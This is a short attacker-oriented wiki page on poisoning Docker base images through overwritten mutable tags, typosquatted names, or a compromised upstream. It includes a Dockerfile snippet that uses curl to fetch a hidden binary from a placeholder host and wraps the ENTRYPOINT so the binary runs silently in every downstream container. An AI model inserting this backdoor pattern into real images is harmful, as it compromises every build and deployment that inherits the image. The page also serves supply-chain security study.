---
title: "Base image poisoning: compromising upstream to reach every downstream build"
description: "Images are built FROM a base image. An attacker who controls or can impersonate a base image, through a compromised upstream repository, a typosquatted name, or a mutable tag they can overwrite, injects code that is inherited by every image built on it, turning one compromise into execution across all downstream builds and deployments."
keywords:
  - base image
  - supply chain
  - typosquatting
  - mutable tag
  - dockerfile from
---

# Base image poisoning

Every Dockerfile begins with `FROM <base>`, and the resulting image inherits that base's filesystem and configuration. Poisoning the base is therefore a supply-chain multiplier: a single malicious change propagates into every image that builds on it, and from there into every container those images run. The attacker's goal is to get their content into a base that downstream builds pull.

## Routes to control a base

```bash
# 1. Overwrite a mutable tag the downstream pulls by name (no digest pin).
#    If the registry accepts the push, the next build FROM base:latest gets it.
docker tag malicious base:latest && docker push <registry>/base:latest

# 2. Typosquat a popular base name so a mistyped FROM pulls the attacker image.
#    e.g. publish "ubunutu" or "node-alpine" to a public namespace.

# 3. Compromise the upstream build or repository that produces the base,
#    inserting a layer that runs attacker code or adds a backdoor.
```

The reason tag overwriting works is that `FROM base:latest` resolves the tag at build time, so whatever the tag points to when the build runs is what is inherited; builds that do not pin a digest are exposed.

## What the poisoned base carries

```dockerfile
# injected into the base so every downstream inherits it
RUN curl -s http://a/agent -o /usr/local/bin/.a && chmod +x /usr/local/bin/.a
ENTRYPOINT ["/bin/sh","-c","/usr/local/bin/.a & exec \"$@\"","--"]
```

An entrypoint wrapper launches the attacker payload alongside the real process, so downstream containers run normally while also running attacker code.

## Exploitation notes

- Mutable tags are the key enabler; a downstream that pins `FROM base@sha256:<digest>` is immune to tag overwriting, so target builds that pull by tag.
- Typosquatting succeeds on public registries where any name can be published; names one edit away from popular bases catch mistyped or auto-completed `FROM` lines.
- The payload belongs in the base's entrypoint or an early layer so it is inherited and runs on every downstream launch; see [Image backdooring](image-backdooring.md) for the single-image equivalent.

## References

- [SLSA: supply-chain threats](https://slsa.dev/spec/v1.0/threats)
- [Docker: pin base images by digest](https://docs.docker.com/build/building/best-practices/)
- [Sysdig: container supply chain attacks](https://sysdig.com/learn-cloud-native/)
